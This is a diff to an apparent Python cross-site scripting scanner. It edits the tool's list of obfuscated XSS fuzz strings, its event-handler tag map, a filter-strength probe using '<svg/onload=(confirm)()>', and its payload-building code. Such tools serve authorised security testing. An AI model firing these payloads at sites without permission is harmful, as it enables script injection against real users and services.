@@ -44,9 +44,9 @@ fuzzes = ['<z oNxXx=yyy>', '<z xXx=yyy>', '<z o%00nload=yyy>', '<z oNStart=confi
 '<deTaiLs x=y>', '<viDeo x=y>', '<MaTh><x:link>', 'x<!--y-->z', '<test>', '<script>String.fromCharCode(99, 111, 110, 102, 105, 114, 109, 40, 41)</script>',
 '">payload<br attr="', '&#x3C;script&#x3E;', '<r sRc=x oNError=r>', '<x OnCliCk=(prompt)()>click',
 '<bGsOund sRc=x>']
-# 事件处理
+# 事件
 event_handlers = {
-    'oNeRror': ['sVg', 'iMg', 'viDeo'],
+    'oNeRror': ['OBjEct', 'iMg', 'viDeo'],
     'oNloAd': ['sVg', 'bOdY'],
     'oNsTart': ['maRQuee'],
     'oNMoUseOver': ['d3v', 'IfRame', 'bOdY'],
@@ -214,7 +214,7 @@ def filter_checker(url, param_data, GET, POST):
     global report
     report += '<p class="font-italic" style="margin-left: 10px">Filter Strength :'
     try:
-        low_param = change_payload( copy.deepcopy(param_data), parse.quote_plus('<svg/onload=(confirm)()>'))
+        low_param = change_payload(copy.deepcopy(param_data), parse.quote_plus('<svg/onload=(confirm)()>'))
         sleep(sleep_delay)
         low_request = get_request(url, low_param, GET, POST)
         if '<svg/onload=(confirm)()>' in low_request:
@@ -412,6 +412,10 @@ def inject(url, param_data, GET, POST):
                                         prefix, tag, filling, 'sRc=', e_filling, '=', e_filling, event_handler,
                                         e_filling,
                                         e_filling, function, l_filling, suffix)
+                                elif tag == 'd3v':
+                                    payload = '%s%s%s%s%s%s=%s%s%s%sthis' % (
+                                        l_than, tag, filling, special, event_handler, e_filling, e_filling,
+                                        function,l_filling, g_than)
                                 else:
                                     payload = '%s<%s%s%s%s%s=%s%s%s>%s' % (
                                         prefix, tag, filling, special, event_handler, e_filling, e_filling, function,
@@ -461,8 +465,7 @@ def inject(url, param_data, GET, POST):
                             else:
                                 payload = '%s%s%s%s%s%s=%s%s%s%s' % (
                                     l_than, tag, filling, special, event_handler, e_filling, e_filling, function,
-                                    l_filling,
-                                    g_than)
+                                    l_filling,g_than)
                             test_filter_char(parse.quote_plus(payload), payload, occurence_num, url, copy.deepcopy(param_data), GET,
                                              POST, action='do')
             report += '</tbody></table></div>'
